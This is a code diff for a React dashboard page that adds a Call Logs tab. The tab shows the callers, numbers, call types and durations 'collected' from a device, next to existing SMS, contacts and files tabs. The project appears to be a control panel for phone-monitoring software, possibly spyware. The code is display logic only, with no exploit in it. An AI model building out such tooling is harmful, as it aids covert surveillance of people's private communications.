@@ -2,7 +2,7 @@
 
 import { useState } from "react";
 import { useParams, useRouter } from "next/navigation";
-import { useDevice, useDeleteDevice, useDeviceSms, useDeviceContacts, useDeviceFiles } from "@/hooks/useDevices";
+import { useDevice, useDeleteDevice, useDeviceSms, useDeviceContacts, useDeviceFiles, useDeviceCallLogs } from "@/hooks/useDevices";
 import { StatusBadge } from "@/components/shared/status-badge";
 import { LoadingSpinner } from "@/components/shared/loading-spinner";
 import { ErrorState } from "@/components/shared/error-state";
@@ -14,10 +14,10 @@ import { formatDate } from "@/lib/utils";
 import {
   FiSmartphone, FiArrowLeft, FiTrash2, FiGlobe, FiHash,
   FiCpu, FiPackage, FiClock, FiCalendar, FiActivity,
-  FiMessageSquare, FiUsers, FiFolder, FiMail, FiPhone,
+  FiMessageSquare, FiUsers, FiFolder, FiMail, FiPhone, FiPhoneCall,
 } from "react-icons/fi";
 
-type Tab = "info" | "sms" | "contacts" | "files";
+type Tab = "info" | "sms" | "contacts" | "files" | "calllogs";
 
 export default function DeviceDetailPage() {
   const params = useParams();
@@ -32,6 +32,7 @@ export default function DeviceDetailPage() {
   const { data: smsData, isLoading: smsLoading } = useDeviceSms(deviceId);
   const { data: contactsData, isLoading: contactsLoading } = useDeviceContacts(deviceId);
   const { data: filesData, isLoading: filesLoading } = useDeviceFiles(deviceId);
+  const { data: callLogsData, isLoading: callLogsLoading } = useDeviceCallLogs(deviceId);
   const deleteMutation = useDeleteDevice();
 
   if (isLoading) {
@@ -63,6 +64,7 @@ export default function DeviceDetailPage() {
     { key: "sms", label: "SMS", icon: <FiMessageSquare className="h-4 w-4" />, count: smsData?.sms?.length },
     { key: "contacts", label: "Contacts", icon: <FiUsers className="h-4 w-4" />, count: contactsData?.contacts?.length },
     { key: "files", label: "Files", icon: <FiFolder className="h-4 w-4" />, count: filesData?.files?.length },
+    { key: "calllogs", label: "Call Logs", icon: <FiPhoneCall className="h-4 w-4" />, count: callLogsData?.callLogs?.length },
   ];
 
   const infoItems = [
@@ -225,6 +227,41 @@ export default function DeviceDetailPage() {
                       <div className="flex gap-3 text-xs text-muted-foreground mt-1">
                         <span>{f.is_directory ? "Directory" : `${(f.size / 1024).toFixed(1)} KB`}</span>
                         {f.last_modified > 0 && <span>{new Date(f.last_modified).toLocaleDateString()}</span>}
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </CardContent>
+        </Card>
+      )}
+
+      {tab === "calllogs" && (
+        <Card>
+          <CardHeader><CardTitle>Call Logs ({callLogsData?.callLogs?.length || 0})</CardTitle></CardHeader>
+          <Separator />
+          <CardContent className="pt-6">
+            {callLogsLoading ? (
+              <LoadingSpinner />
+            ) : !callLogsData?.callLogs?.length ? (
+              <p className="text-sm text-muted-foreground text-center py-8">No call logs collected yet</p>
+            ) : (
+              <div className="space-y-2 max-h-[600px] overflow-y-auto">
+                {callLogsData.callLogs.map((c: any, i: number) => (
+                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/50">
+                    <FiPhoneCall className="h-4 w-4 mt-1 text-muted-foreground shrink-0" />
+                    <div className="min-w-0 flex-1">
+                      <div className="flex items-center gap-2">
+                        <span className="text-sm font-medium">{c.name || c.number || "Unknown"}</span>
+                        <Badge variant={c.type === 1 ? "default" : c.type === 2 ? "secondary" : "outline"} className="text-[10px]">
+                          {c.type === 1 ? "Incoming" : c.type === 2 ? "Outgoing" : "Missed"}
+                        </Badge>
+                      </div>
+                      <p className="text-xs text-muted-foreground">{c.number}</p>
+                      <div className="flex gap-3 text-xs text-muted-foreground mt-1">
+                        <span>{c.date ? new Date(c.date).toLocaleString() : ""}</span>
+                        <span>{c.duration ? `${Math.floor(c.duration / 60)}:${(c.duration % 60).toString().padStart(2, "0")}` : "0:00"}</span>
                       </div>
                     </div>
                   </div>
